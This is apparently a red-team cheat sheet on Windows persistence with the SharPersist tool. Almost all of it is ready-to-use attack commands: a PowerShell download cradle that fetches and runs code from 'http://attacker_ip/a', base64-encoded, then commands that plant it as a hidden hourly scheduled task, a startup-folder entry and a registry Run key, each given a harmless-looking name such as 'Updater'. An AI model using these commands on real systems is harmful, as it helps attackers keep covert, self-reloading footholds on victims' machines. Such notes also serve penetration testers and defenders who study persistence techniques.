# SharPersist

https://github.com/mandiant/SharPersist/releases/tag/v1.0.1

Common userland persistences:
 
1) HKCU / HKLM Registry Autoruns

2) Scheduled Tasks

3) Startup Folder

##### Convert command to execute to base64

    $str = 'IEX ((new-object net.webclient).downloadstring("http://attacker_ip/a"))'
    [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

##### Via scheduled task

    .\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly

##### Via startup folder

    .\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -f "UserEnvSetup" -m add

##### Via registry key, first create a .exe beacon named updater.exe, then

    .\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
